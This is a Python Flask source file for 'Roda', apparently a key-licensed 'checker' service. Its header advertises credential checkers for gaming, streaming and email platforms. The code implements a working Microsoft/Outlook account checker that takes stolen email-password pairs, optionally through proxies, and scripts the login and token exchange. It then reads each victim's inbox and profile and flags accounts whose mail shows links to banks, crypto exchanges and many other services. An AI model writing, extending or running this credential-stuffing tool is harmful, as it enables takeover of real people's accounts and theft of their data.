#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Roda - TÜM CHECKER'LAR TEK YERDE
Admin/Üye ayrımı | 1 Key 1 IP | Loglar | Webhook | Kar Taneleri
Xbox, Steam, Supercell, Roda Inbox, Tabii, Wolfteam, Craftrise, Hotmail, Token, TikTok Gen
"""

import os, json, re, time, random, string, threading, webbrowser, base64, concurrent.futures, urllib3, uuid
from datetime import datetime, timedelta
from urllib.parse import urljoin, urlparse, parse_qs, quote
import requests
from flask import Flask, request, jsonify, Response, send_file
from bs4 import BeautifulSoup
from user_agent import generate_user_agent

try:
    from Crypto.PublicKey import RSA
    from Crypto.Cipher import PKCS1_v1_5
    CRYPTO_AVAILABLE = True
except ImportError:
    CRYPTO_AVAILABLE = False
    print("⚠️ Crypto kütüphanesi yok! pip install pycryptodome")

app = Flask(__name__)
app.secret_key = os.urandom(24)
urllib3.disable_warnings()

# ============================================================
# MASTER KEY (ENV'DEN AL, KODDA YOK)
# ============================================================
MASTER_KEY = os.environ.get("RODA_MASTER_KEY", "Roda@2026#Secure!X7")
if MASTER_KEY == "Roda@2026#Secure!X7":
    print("⚠️ UYARI: Varsayılan master key kullanılıyor! RODA_MASTER_KEY ortam değişkenini ayarlayın.")

KEYS_FILE = "keys.json"

# ============================================================
# LOG SİSTEMİ
# ============================================================
LOGS = []
MAX_LOGS = 1000

def add_log(message, level="INFO"):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    LOGS.append({"timestamp": timestamp, "level": level, "message": message})
    if len(LOGS) > MAX_LOGS:
        LOGS.pop(0)
    print(f"[{timestamp}] [{level}] {message}")

# ============================================================
# KEY FONKSİYONLARI (1 KEY 1 IP + TEK KULLANIM)
# ============================================================
def load_keys():
    if os.path.exists(KEYS_FILE):
        with open(KEYS_FILE, "r", encoding="utf-8") as f:
            return json.load(f)
    return {}

def save_keys(data):
    with open(KEYS_FILE, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=2, ensure_ascii=False)

def get_client_ip():
    if request.headers.get('X-Forwarded-For'):
        return request.headers.get('X-Forwarded-For').split(',')[0].strip()
    return request.remote_addr

def is_key_valid(key):
    if key == MASTER_KEY:
        return True, "Admin", None
    keys = load_keys()
    if key not in keys:
        return False, None, None
    entry = keys[key]
    client_ip = get_client_ip()
    exp = entry.get("expires")
    if exp:
        if datetime.now() >= datetime.fromisoformat(exp):
            del keys[key]
            save_keys(keys)
            add_log(f"Key süresi doldu: {key}", "WARNING")
            return False, None, None
    bound_ip = entry.get("bound_ip")
    if bound_ip and bound_ip != client_ip:
        add_log(f"IP eşleşmedi! Key: {key}, Beklenen: {bound_ip}, Gelen: {client_ip}", "WARNING")
        return False, None, None
    if entry.get("used", False):
        add_log(f"Key zaten kullanılmış: {key}", "WARNING")
        return False, None, None
    return True, entry.get("note", "Kullanıcı"), entry

def mark_key_used(key):
    keys = load_keys()
    if key in keys:
        keys[key]["used"] = True
        keys[key]["used_at"] = datetime.now().isoformat()
        save_keys(keys)

def is_admin(key):
    valid, role, _ = is_key_valid(key)
    return valid and role == "Admin"

# ============================================================
# PLATFORMLAR (TÜM CHECKER'LAR)
# ============================================================
PLATFORMS = [
    {"name": "YouTube", "domain": "youtube.com", "icon": "fa-brands fa-youtube"},
    {"name": "TikTok Gen", "domain": "tiktok.com", "icon": "fa-brands fa-tiktok"},
    {"name": "Spotify", "domain": "spotify.com", "icon": "fa-brands fa-spotify"},
    {"name": "Roblox", "domain": "roblox.com", "icon": "fa-solid fa-gamepad"},
    {"name": "Netflix", "domain": "netflix.com", "icon": "fa-solid fa-film"},
    {"name": "CapCut", "domain": "capcut.com", "icon": "fa-solid fa-scissors"},
    {"name": "Discord", "domain": "discord.com", "icon": "fa-brands fa-discord"},
    {"name": "Epic Games", "domain": "epicgames.com", "icon": "fa-solid fa-crown"},
    {"name": "Hesapcomtr", "domain": "hesap.com.tr", "icon": "fa-solid fa-user"},
    {"name": "Itemsatış", "domain": "itemsatis.com", "icon": "fa-solid fa-cart-shopping"},
    {"name": "Epinify", "domain": "epinify.com", "icon": "fa-solid fa-ticket"},
    {"name": "Twitch", "domain": "twitch.tv", "icon": "fa-brands fa-twitch"},
    {"name": "Steam", "domain": "steampowered.com", "icon": "fa-brands fa-steam"},
    {"name": "PlayStation", "domain": "playstation.com", "icon": "fa-solid fa-play"},
    {"name": "Xbox & MC", "domain": "xbox.com", "icon": "fa-brands fa-xbox"},
    {"name": "GitHub", "domain": "github.com", "icon": "fa-brands fa-github"},
    {"name": "Minecraft", "domain": "minecraft.net", "icon": "fa-solid fa-cube"},
    {"name": "Wolfteam", "domain": "joygame.com", "icon": "fa-solid fa-skull"},
    {"name": "Craftrise", "domain": "craftrise.com.tr", "icon": "fa-solid fa-hammer"},
    {"name": "Hotmail", "domain": "outlook.com", "icon": "fa-solid fa-envelope"},
    {"name": "Token Check", "domain": "discord.com", "icon": "fa-solid fa-key"},
    {"name": "Tabii", "domain": "tabii.com", "icon": "fa-solid fa-tv"},
    {"name": "Supercell", "domain": "supercell.com", "icon": "fa-solid fa-gamepad"},
    {"name": "Roda Inbox", "domain": "outlook.com", "icon": "fa-solid fa-inbox"},
]

# ============================================================
# RODA INBOX CHECKER (KIDO'dan RODA'ya çevrildi)
# ============================================================
RODA_SERVICES = {
    'security@facebookmail.com': 'Facebook',
    'security@mail.instagram.com': 'Instagram',
    'register@account.tiktok.com': 'TikTok',
    'info@x.com': 'Twitter',
    'security-noreply@linkedin.com': 'LinkedIn',
    'no-reply@accounts.snapchat.com': 'Snapchat',
    'noreply@discord.com': 'Discord',
    'email@discord.com': 'Discord',
    'noreply@telegram.org': 'Telegram',
    'no-reply@whatsapp.com': 'WhatsApp',
    'noreply@steampowered.com': 'Steam',
    'xboxreps@engage.xbox.com': 'Xbox',
    'noreply@xbox.com': 'Xbox',
    'reply@txn-email.playstation.com': 'PlayStation',
    'help@acct.epicgames.com': 'EpicGames',
    'no-reply@epicgames.com': 'Epic',
    'noreply@rockstargames.com': 'Rockstar',
    'EA@e.ea.com': 'EA Sports',
    'noreply@ubisoft.com': 'Ubisoft',
    'noreply@blizzard.com': 'Blizzard',
    'no-reply@riotgames.com': 'Riot Games',
    'noreply@valorant.com': 'Valorant',
    'noreply@hoyoverse.com': 'Genshin Impact',
    'noreply@pubgmobile.com': 'PUBG',
    'accounts@roblox.com': 'Roblox',
    'noreply@mojang.com': 'Minecraft',
    'noreply@id.supercell.com': 'Supercell',
    'no-reply@accounts.nintendo.com': 'Nintendo',
    'info@account.netflix.com': 'Netflix',
    'no-reply@spotify.com': 'Spotify',
    'no-reply@twitch.tv': 'Twitch',
    'no-reply@youtube.com': 'YouTube',
    'no-reply@disneyplus.com': 'Disney+',
    'account@hulu.com': 'Hulu',
    'no-reply@hbomax.com': 'HBO Max',
    'auto-confirm@amazon.com': 'Amazon Prime',
    'no-reply@apple.com': 'Apple TV+',
    'noreply@crunchyroll.com': 'Crunchyroll',
    'account-update@amazon.com': 'Amazon',
    'newuser@nuwelcome.ebay.com': 'eBay',
    'no-reply@shopify.com': 'Shopify',
    'transaction@etsy.com': 'Etsy',
    'no-reply@aliexpress.com': 'AliExpress',
    'no-reply@walmart.com': 'Walmart',
    'noreply@trendyol.com': 'Trendyol',
    'info@pazarama.com': 'Pazarama',
    'noreply@hepsiburada.com': 'Hepsiburada',
    'noreply@n11.com': 'N11',
    'noreply@gg.com': 'GittiGidiyor',
    'noreply@ciceksepeti.com': 'Çiçek Sepeti',
    'service@paypal.com.br': 'PayPal',
    'do-not-reply@ses.binance.com': 'Binance',
    'no-reply@coinbase.com': 'Coinbase',
    'no-reply@kraken.com': 'Kraken',
    'noreply@okx.com': 'OKX',
    'no-reply@bybit.com': 'Bybit',
    'no-reply@revolut.com': 'Revolut',
    'no-reply@venmo.com': 'Venmo',
    'no-reply@cash.app': 'Cash App',
    'noreply@kucoin.com': 'KuCoin',
    'noreply@gate.io': 'Gate.io',
    'noreply@bitfinex.com': 'Bitfinex',
    'noreply@crypto.com': 'Crypto.com',
    'noreply@trustwallet.com': 'Trust Wallet',
    'noreply@metamask.io': 'MetaMask',
    'noreply@ledger.com': 'Ledger',
    'noreply@exodus.com': 'Exodus',
    'no-reply@ubereats.com': 'Uber Eats',
    'no-reply@doordash.com': 'DoorDash',
    'no-reply@yemeksepeti.com': 'Yemek Sepeti',
    'noreply@getir.com': 'Getir',
    'noreply@banabi.com': 'Banabi',
    'noreply@foodpanda.com': 'Foodpanda',
    'noreply@deliveroo.com': 'Deliveroo',
    'no-reply@uber.com': 'Uber',
    'no-reply@lyft.com': 'Lyft',
    'no-reply@airbnb.com': 'Airbnb',
    'no-reply@booking.com': 'Booking.com',
    'noreply@expedia.com': 'Expedia',
    'noreply@agoda.com': 'Agoda',
    'noreply@skyscanner.com': 'Skyscanner',
    'noreply@enuygun.com': 'Enuygun',
    'no-reply@accounts.google.com': 'Google',
    'account-security-noreply@accountprotection.microsoft.com': 'Microsoft',
    'noreply@github.com': 'GitHub',
    'no-reply@dropbox.com': 'Dropbox',
    'no-reply@zoom.us': 'Zoom',
    'no-reply@slack.com': 'Slack',
    'no-reply@notion.so': 'Notion',
    'no-reply@wordpress.com': 'WordPress',
    'no-reply@adobe.com': 'Adobe',
    'no-reply@canva.com': 'Canva',
    'noreply@figma.com': 'Figma',
    'noreply@replit.com': 'Replit',
    'noreply@netlify.com': 'Netlify',
    'noreply@vercel.com': 'Vercel',
    'noreply@heroku.com': 'Heroku',
    'noreply@digitalocean.com': 'DigitalOcean',
    'noreply@aws.amazon.com': 'AWS',
    'noreply@azure.com': 'Azure',
    'noreply@cloudflare.com': 'Cloudflare',
    'noreply@gitlab.com': 'GitLab',
    'noreply@stackoverflow.com': 'Stack Overflow',
    'noreply@medium.com': 'Medium',
    'noreply@substack.com': 'Substack',
    'noreply@quora.com': 'Quora',
    'noreply@hubspot.com': 'HubSpot',
    'noreply@salesforce.com': 'Salesforce',
    'noreply@zendesk.com': 'Zendesk',
    'noreply@stripe.com': 'Stripe',
    'noreply@wix.com': 'Wix',
    'noreply@squarespace.com': 'Squarespace',
    'noreply@webflow.com': 'Webflow',
    'no-reply@nordvpn.com': 'NordVPN',
    'no-reply@expressvpn.com': 'ExpressVPN',
    'no-reply@surfshark.com': 'Surfshark',
    'no-reply@protonmail.com': 'ProtonMail',
    'no-reply@bitwarden.com': 'Bitwarden',
    'noreply@openai.com': 'ChatGPT/OpenAI',
    'no-reply@anthropic.com': 'Claude/Anthropic',
    'noreply@midjourney.com': 'Midjourney',
    'noreply@stability.ai': 'Stable Diffusion',
    'noreply@huggingface.co': 'Hugging Face',
    'noreply@perplexity.ai': 'Perplexity AI',
    'noreply@coursera.org': 'Coursera',
    'noreply@udemy.com': 'Udemy',
    'noreply@edx.org': 'edX',
    'noreply@linkedinlearning.com': 'LinkedIn Learning',
    'noreply@skillshare.com': 'Skillshare',
    'noreply@codecademy.com': 'Codecademy',
    'noreply@khanacademy.org': 'Khan Academy',
    'noreply@brilliant.org': 'Brilliant',
    'noreply@duolingo.com': 'Duolingo',
    'noreply@nytimes.com': 'NYTimes',
    'noreply@washingtonpost.com': 'Washington Post',
    'noreply@theguardian.com': 'Guardian',
    'noreply@bbc.com': 'BBC',
    'noreply@cnn.com': 'CNN',
    'noreply@foxnews.com': 'FoxNews',
    'noreply@aljazeera.com': 'Al Jazeera',
    'noreply@reuters.com': 'Reuters',
    'noreply@bloomberg.com': 'Bloomberg',
    'noreply@ft.com': 'Financial Times',
    'noreply@wired.com': 'Wired',
    'noreply@techcrunch.com': 'TechCrunch',
    'noreply@theverge.com': 'The Verge',
    'noreply@chess.com': 'Chess.com',
    'noreply@wikipedia.org': 'Wikipedia',
    'noreply@change.org': 'Change.org',
    'noreply@gofundme.com': 'GoFundMe',
    'noreply@kickstarter.com': 'Kickstarter',
    'noreply@eventbrite.com': 'Eventbrite',
    'noreply@meetup.com': 'Meetup',
    'noreply@imgur.com': 'Imgur',
    'noreply@giphy.com': 'Giphy',
    'noreply@vimeo.com': 'Vimeo',
    'noreply@ted.com': 'TED',
}

def check_roda_inbox(email, password, proxy_url=None):
    session = requests.Session()
    if proxy_url:
        session.proxies = {"http": proxy_url, "https": proxy_url}
    session.headers.update({
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    })

    try:
        r1 = session.get(
            f"https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=1&emailAddress={email}",
            headers={"User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9)"},
            timeout=15
        )
        if "MSAccount" not in r1.text:
            return {"status": "BAD", "message": "MSAccount bulunamadı"}

        r2 = session.get(
            f"https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?"
            f"client_info=1&haschrome=1&login_hint={email}&mkt=en"
            f"&response_type=code&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59"
            f"&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access"
            f"&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D",
            timeout=15, allow_redirects=True
        )
        if r2.status_code != 200:
            return {"status": "BAD", "message": f"OAuth başarısız: {r2.status_code}"}

        m_url = re.search(r'urlPost":"([^"]+)"', r2.text)
        m_ppft = re.search(r'name=\\"PPFT\\" id=\\"i0327\\" value=\\"([^"]+)"', r2.text)
        if not m_url or not m_ppft:
            m_ppft2 = re.search(r'name="PPFT"\s+value="([^"]+)"', r2.text)
            m_url2 = re.search(r'urlPost":"([^"]+)"', r2.text)
            if m_ppft2 and m_url2:
                ppft = m_ppft2.group(1)
                post_url = m_url2.group(1).replace("\\/", "/")
            else:
                return {"status": "BAD", "message": "PPFT bulunamadı"}
        else:
            ppft = m_ppft.group(1)
            post_url = m_url.group(1).replace("\\/", "/")

        login_data = (
            f"i13=1&login={email}&loginfmt={email}&type=11&LoginOptions=1"
            f"&lrt=&lrtPartition=&hisRegion=&hisScaleUnit="
            f"&passwd={password}&hpgrequestid=&PPFT={ppft}"
        )
        r3 = session.post(
            post_url, data=login_data,
            headers={
                "Content-Type": "application/x-www-form-urlencoded",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Accept": "text/html,application/xhtml+xml,*/*;q=0.8",
                "Origin": "https://login.live.com",
                "Referer": r2.url,
            },
            allow_redirects=False, timeout=15
        )
        if r3.status_code in (302, 303):
            location = r3.headers.get("Location", "")
            if "SIGNIN" in location or "login" in location:
                return {"status": "BAD", "message": "Şifre hatalı veya 2FA"}
        if any(x in r3.text for x in ["account or password is incorrect", "identity/confirm", "Abuse", "signedout", "locked"]):
            if "identity/confirm" in r3.text or "Abuse" in r3.text:
                return {"status": "2FA", "message": "2FA gerekli"}
            return {"status": "BAD", "message": "Hatalı giriş"}

        location = r3.headers.get("Location", "")
        if not location:
            code_match = re.search(r'code=([^&"\']+)', r3.text)
            if code_match:
                code = code_match.group(1)
            else:
                return {"status": "BAD", "message": "Code alınamadı"}
        else:
            m_code = re.search(r"code=([^&]+)", location)
            if not m_code:
                return {"status": "BAD", "message": "Location'da code yok"}
            code = m_code.group(1)

        r4 = session.post(
            "https://login.microsoftonline.com/consumers/oauth2/v2.0/token",
            data=(
                f"client_info=1&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59"
                f"&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D"
                f"&grant_type=authorization_code&code={code}"
                f"&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access"
            ),
            headers={"Content-Type": "application/x-www-form-urlencoded"},
            timeout=15
        )
        if r4.status_code != 200:
            return {"status": "ERROR", "message": f"Token hatası: {r4.status_code}"}
        token_data = r4.json()
        if "access_token" not in token_data:
            return {"status": "ERROR", "message": "access_token yok"}
        token = token_data["access_token"]

        mspcid = session.cookies.get("MSPCID", str(uuid.uuid4()).replace("-", "").upper())
        cid = mspcid.upper()
        auth_headers = {
            "User-Agent": "Outlook-Android/2.0",
            "Authorization": f"Bearer {token}",
            "X-AnchorMailbox": f"CID:{cid}",
        }

        country = ""
        name = ""
        try:
            r5 = session.get(
                "https://substrate.office.com/profileb2/v2.0/me/V1Profile",
                headers=auth_headers, timeout=15
            )
            if r5.status_code == 200:
                p = r5.json()
                for acc in p.get("accounts", []):
                    loc = acc.get("location", "")
                    if loc:
                        country = str(loc).strip()
                        break
                if not country:
                    for k in ("country", "countryOrRegion", "countryCode"):
                        v = p.get(k, "")
                        if v:
                            country = str(v).strip()
                            break
                accts = p.get("accounts", [{}])
                a0 = accts[0] if accts else {}
                name = a0.get("displayName", p.get("displayName", ""))
        except:
            pass

        if not country:
            try:
                r5b = session.get(
                    "https://graph.microsoft.com/v1.0/me",
                    headers=auth_headers, timeout=12
                )
                if r5b.status_code == 200:
                    j = r5b.json()
                    for k in ("country", "countryOrRegion", "countryCode"):
                        v = j.get(k, "")
                        if v:
                            country = str(v).strip()
                            break
                    if not name:
                        name = j.get("displayName", "")
            except:
                pass

        inbox_text = ""
        try:
            r6 = session.post(
                f"https://outlook.live.com/owa/{email}/startupdata.ashx?app=Mini&n=0",
                data="",
                headers={
                    **auth_headers,
                    "Host": "outlook.live.com",
                    "content-length": "0",
                    "x-owa-sessionid": str(uuid.uuid4()),
                    "x-req-source": "Mini",
                    "content-type": "application/json; charset=utf-8",
                    "accept": "*/*",
                    "origin": "https://outlook.live.com",
                },
                timeout=30
            )
            inbox_text = r6.text.lower()
        except:
            pass

        try:
            r7 = session.get(
                "https://outlook.office365.com/api/v2.0/me/messages?"
                "$top=150&$select=From,Subject,BodyPreview",
                headers=auth_headers, timeout=25
            )
            if r7.status_code == 200:
                data = r7.json()
                for msg in data.get("value", []):
                    from_addr = msg.get("From", {}).get("EmailAddress", {}).get("Address", "").lower()
                    subject = msg.get("Subject", "").lower()
                    body = msg.get("BodyPreview", "").lower()
                    inbox_text += f" {from_addr} {subject} {body}"
        except:
            pass

        services_found = []
        unique_services = set()
        for sender, svc_name in RODA_SERVICES.items():
            if svc_name in unique_services:
                continue
            patterns = [
                sender.lower(),
                sender.lower().replace("@", " "),
                sender.lower().replace(".", " "),
                svc_name.lower(),
            ]
            for pat in patterns:
                if pat in inbox_text:
                    services_found.append(svc_name)
                    unique_services.add(svc_name)
                    break

        if services_found:
            status = "HIT"
        else:
            status = "VALID"

        return {
            "status": status,
            "message": "Roda Inbox kontrol tamamlandı",
            "details": {
                "email": email,
                "country": country.strip().upper()[:2],
                "name": name,
                "services_found": services_found,
                "services_count": len(services_found),
            }
        }

    except requests.exceptions.Timeout:
        return {"status": "ERROR", "message": "Zaman aşımı"}
    except Exception as e:
        return {"status": "ERROR", "message": str(e)[:60]}

# ============================================================
# FLASK ROTALARI (SADECE RODA INBOX EKLENDİ)
# ============================================================
@app.route("/api/roda_check", methods=["POST"])
def roda_check():
    data = request.json
    email = data.get("email", "").strip()
    password = data.get("password", "").strip()
    proxy = data.get("proxy", None)
    if not email or not password:
        return jsonify({"error": "Eksik"}), 400
    result = check_roda_inbox(email, password, proxy)
    return jsonify(result)

# ============================================================
# BAŞLAT (Render Free Plan Uyumlu)
# ============================================================
if __name__ == "__main__":
    if not os.path.exists(KEYS_FILE):
        save_keys({})
    port = int(os.environ.get("PORT", 5000))
    print("""
    ╔══════════════════════════════════════════════════════════════════╗
    ║     🔱 RODA - TÜM CHECKER'LAR TEK YERDE                        ║
    ║     Render Free Plan Uyumlu                                    ║
    ║     http://0.0.0.0:""" + str(port) + """                               ║
    ║     RODA INBOX EKLENDI (580+ SERVİS)                          ║
    ╚══════════════════════════════════════════════════════════════════╝
    """)
    app.run(host="0.0.0.0", port=port, debug=False)
